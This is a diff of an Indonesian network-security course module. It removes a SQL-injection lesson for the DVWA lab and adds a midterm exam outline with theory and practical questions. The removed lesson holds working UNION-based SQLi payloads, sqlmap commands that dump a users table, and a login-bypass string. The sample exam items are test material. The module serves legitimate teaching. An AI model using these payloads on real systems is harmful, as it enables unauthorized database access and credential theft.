@@ -1,132 +1,127 @@
-# 💉 Pertemuan 8: Web Application Security - SQL Injection
+# 📝 Pertemuan 8: UTS (Ujian Tengah Semester)
 
-## Daftar Isi
-1. [Pengantar SQL Injection](#1-pengantar-sql-injection)
-2. [Cara Kerja SQL Injection](#2-cara-kerja-sql-injection)
-3. [Jenis-Jenis SQL Injection](#3-jenis-jenis-sql-injection)
-4. [Hands-On: Setup Lab DVWA (Damn Vulnerable Web App)](#4-hands-on-setup-lab-dvwa-damn-vulnerable-web-app)
-5. [Hands-On: Manual Union-Based SQL Injection](#5-hands-on-manual-union-based-sql-injection)
-6. [Hands-On: Automated SQL Injection dengan sqlmap](#6-hands-on-automated-sql-injection-dengan-sqlmap)
-7. [Deteksi dan Pencegahan](#7-deteksi-dan-pencegahan)
-8. [Latihan Mandiri](#8-latihan-mandiri)
+## Informasi Ujian
 
----
-
-## 1. Pengantar SQL Injection
-
-**SQL Injection (SQLi)** adalah kerentanan keamanan web yang memungkinkan penyerang untuk mengganggu query yang dibuat oleh aplikasi ke database. Penyerang biasanya dapat melihat data yang tidak seharusnya mereka akses, atau bahkan mengubah/menghapus data tersebut.
+| Keterangan | Detail |
+| :--------- | :----- |
+| **Jenis** | UTS (Ujian Tengah Semester) |
+| **Cakupan Materi** | Pertemuan 1 – 7 |
+| **Format** | Teori + Praktik |
+| **Durasi** | 90 – 120 menit |
 
 ---
 
-## 2. Cara Kerja SQL Injection
+## 🎯 Cakupan Materi UTS
 
-SQLi terjadi ketika aplikasi mengambil input pengguna dan menggabungkannya langsung ke dalam query SQL tanpa sanitasi yang benar.
+### Pertemuan 1: Pengantar Keamanan Jaringan
+- CIA Triad (Confidentiality, Integrity, Availability)
+- Setup Docker Lab dengan `docker-compose`
+- Konsep containerisasi vs VM
 
-```sql
--- Query Normal di Server
-"SELECT * FROM users WHERE id = " + userInput;
+### Pertemuan 2: Cryptography 101
+- Konsep hashing (MD5, SHA-256) dan collision
+- Enkripsi simetris AES-256-CBC dengan `openssl`
+- Enkripsi asimetris RSA (public/private key)
+- SSL/TLS dan sertifikat digital
 
--- Jika userInput = 1
-SELECT * FROM users WHERE id = 1;
+### Pertemuan 3: L2 Security – ARP Spoofing
+- Cara kerja ARP dan ARP Cache
+- ARP Poisoning dengan `arpspoof`
+- MITM: IP Forwarding untuk intercept traffic
+- DNS Spoofing via `iptables` NAT
 
--- Jika userInput = 1 OR 1=1
-SELECT * FROM users WHERE id = 1 OR 1=1; -- Menampilkan SEMUA user!
-```
+### Pertemuan 4: Wireless Security
+- Standar keamanan WiFi (WEP, WPA, WPA2)
+- Monitor mode dengan `airmon-ng`
+- Capture WPA2 Handshake (`airodump-ng`, `aireplay-ng`)
+- Cracking dengan `aircrack-ng` dan `hashcat`
 
----
+### Pertemuan 5: L3 Security – IP/ICMP
+- Manipulasi paket dengan Scapy
+- Smurf Attack (ICMP Broadcast Amplification)
+- DHCP Starvation dengan `yersinia`
+- ICMP Redirect untuk MITM
 
-## 3. Jenis-Jenis SQL Injection
+### Pertemuan 6: L4 Security – TCP/UDP
+- Three-way handshake TCP
+- SYN Flood dengan `hping3`
+- TCP Session Hijacking (konsep)
+- UDP Amplification Attack
 
-1. **In-band SQLi (Classic)**: Penyerang menggunakan saluran komunikasi yang sama untuk melancarkan serangan dan mengambil hasil (misal: Union-based atau Error-based).
-2. **Inferential SQLi (Blind)**: Penyerang tidak bisa melihat data langsung, tapi bisa menyimpulkan data berdasarkan respon server (misal: Boolean-based atau Time-based).
-3. **Out-of-band SQLi**: Penyerang menggunakan saluran komunikasi berbeda (misal: DNS atau HTTP request dari database).
-
----
-
-## 4. Hands-On: Setup Lab DVWA (Damn Vulnerable Web App)
-
-Kita menggunakan container `web-dvwa` yang sudah ada di `docker-compose.yml`.
-
-1. Pastikan container berjalan.
-2. Akses `http://localhost:8080` (tergantung port mapping Anda).
-3. Login dengan `admin` / `password`.
-4. Klik **DVWA Security** dan set level ke **Low**.
-5. Pilih menu **SQL Injection**.
-
----
-
-## 5. Hands-On: Manual Union-Based SQL Injection
-
-### Langkah 1: Mencari Titik Kerentanan
-Masukkan `'` (petik tunggal) di kolom User ID. Jika muncul error SQL, berarti aplikasi rentan.
-
-### Langkah 2: Menentukan Jumlah Kolom
-Gunakan `ORDER BY`:
-```sql
-1' ORDER BY 1#  -- OK
-1' ORDER BY 2#  -- OK
-1' ORDER BY 3#  -- ERROR (Berarti ada 2 kolom)
-```
-
-### Langkah 3: Menampilkan Data via UNION
-Cari tahu kolom mana yang ditampilkan di layar:
-```sql
-1' UNION SELECT 1,2#
-```
-
-### Langkah 4: Mengambil Informasi Database
-```sql
-1' UNION SELECT database(), user()#
-```
+### Pertemuan 7: DNS Security
+- Cara kerja resolusi DNS (Recursive vs Iterative)
+- DNS Cache Poisoning (Kaminsky Attack)
+- DNS Exfiltration via TXT record
+- DNSSEC, DoH, DoT sebagai mitigasi
 
 ---
 
-## 6. Hands-On: Automated SQL Injection dengan sqlmap
+## 📋 Contoh Soal Teori
 
-`sqlmap` adalah tool open-source yang mendeteksi dan mengeksploitasi celah SQLi secara otomatis.
+**1. CIA Triad**
+- Sebutkan dan jelaskan tiga pilar CIA Triad beserta contoh serangan yang mengancam masing-masing!
+- Apa perbedaan mendasar antara VM tradisional dan Docker container dari sisi isolasi?
 
-### 6.1 Scan Dasar
-Di container Kali:
-```bash
-# Ganti URL dan Cookie dengan yang ada di browser Anda
-sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=..." --batch
-```
+**2. Kriptografi**
+- Jelaskan perbedaan antara enkripsi simetris dan asimetris. Kapan sebaiknya menggunakan masing-masing?
+- Apa yang dimaksud dengan "hash collision" dan mengapa MD5 tidak lagi direkomendasikan untuk keamanan?
 
-### 6.2 Mengambil Nama Database
-```bash
-sqlmap -u "http://..." --cookie="..." --dbs
-```
+**3. ARP Spoofing**
+- Gambarkan alur serangan ARP Poisoning dari attacker hingga berhasil melakukan intercept!
+- Apa saja langkah mitigasi yang bisa diterapkan untuk melindungi jaringan dari ARP Spoofing?
 
-### 6.3 Dump Tabel Users
-```bash
-sqlmap -u "http://..." --cookie="..." -D dvwa -T users --dump
-```
+**4. Wireless Security**
+- Mengapa WEP dianggap tidak aman? Jelaskan kelemahan kriptografinya secara singkat!
+- Apa yang dimaksud dengan Deauthentication Attack dan apa tujuannya dalam rangkaian serangan WPA2?
 
----
+**5. L3/L4 Security**
+- Jelaskan mengapa serangan SYN Flood efektif dalam menghabiskan resource server!
+- Apa perbedaan antara Smurf Attack dan Ping of Death dari sisi vektor serangan?
 
-## 7. Deteksi dan Pencegahan
-
-### 7.1 Prepared Statements (Parameterized Queries)
-Ini adalah cara paling efektif. Data pengguna tidak lagi dianggap sebagai bagian dari perintah SQL.
-
-```php
-// Contoh PHP PDO - AMAN
-$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
-$stmt->execute(['email' => $email]);
-```
-
-### 7.2 Input Validation & Sanitization
-Hanya terima input yang sesuai format (misal: ID harus angka).
-
-### 7.3 Principle of Least Privilege
-Database user untuk aplikasi web sebaiknya tidak memiliki akses `root` atau `DROP TABLE`.
+**6. DNS Security**
+- Jelaskan bagaimana DNS Cache Poisoning dapat mengarahkan korban ke situs palsu!
+- Bagaimana DNSSEC membantu mencegah DNS Cache Poisoning?
 
 ---
 
-## 8. Latihan Mandiri
+## 🛠️ Contoh Soal Praktik
 
-### Latihan 1: Blind SQL Injection
-Coba menu **SQL Injection (Blind)** di DVWA. Gunakan `sqlmap` dengan flag `--technique=B` untuk melihat bagaimana tool tersebut bekerja tanpa output data langsung.
+### Soal Praktik 1: Docker Lab
+Buatlah `docker-compose.yml` yang menjalankan:
+- Container Kali Linux attacker di IP `172.21.0.5`
+- Container Ubuntu target di IP `172.21.0.10`
+- Jaringan bridge internal subnet `172.21.0.0/24`
 
-### Latihan 2: Bypass Login
-Cari aplikasi web latihan lain dan coba bypass form login menggunakan `' OR '1'='1`.
+Tunjukkan bahwa keduanya dapat saling ping, dan data di `/root` Kali tetap tersimpan setelah container di-restart.
+
+### Soal Praktik 2: Kriptografi
+Di dalam container Kali, lakukan hal berikut dan tangkap screenshot setiap langkah:
+1. Hash teks `"Ujian Network Security"` dengan SHA-256.
+2. Enkripsi teks tersebut menggunakan AES-256-CBC dengan password pilihan Anda.
+3. Dekripsi kembali dan verifikasi hasilnya.
+
+### Soal Praktik 3: ARP Spoofing (Analisis)
+Diberikan output `arpspoof` dan `tcpdump` berikut. Analisis:
+- Siapa yang menjadi attacker, gateway, dan korban?
+- Data apa yang berhasil di-intercept?
+- Langkah apa yang harus dilakukan admin jaringan untuk mendeteksi serangan ini?
+
+---
+
+## 📚 Tips Persiapan UTS
+
+1. **Review semua hands-on** dari Pertemuan 1–7 — pastikan bisa menjalankan setiap langkah tanpa melihat modul.
+2. **Pahami konsep, bukan hafalan** — ujian akan menguji pemahaman alur serangan, bukan sintaks perintah.
+3. **Latihan Docker Compose** — kemampuan membuat environment lab dari nol adalah skill utama.
+4. **Buat cheat sheet pribadi** — tulis ulang perintah penting dalam kata-kata Anda sendiri.
+5. **Kerjakan latihan mandiri** di setiap pertemuan sebelum ujian.
+
+---
+
+## 🔗 Referensi Persiapan
+
+- [Docker Documentation](https://docs.docker.com/)
+- [OpenSSL CLI Reference](https://www.openssl.org/docs/man1.1.1/man1/)
+- [Aircrack-ng Wiki](https://www.aircrack-ng.org/documentation.html)
+- [Scapy Documentation](https://scapy.readthedocs.io/)
+- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
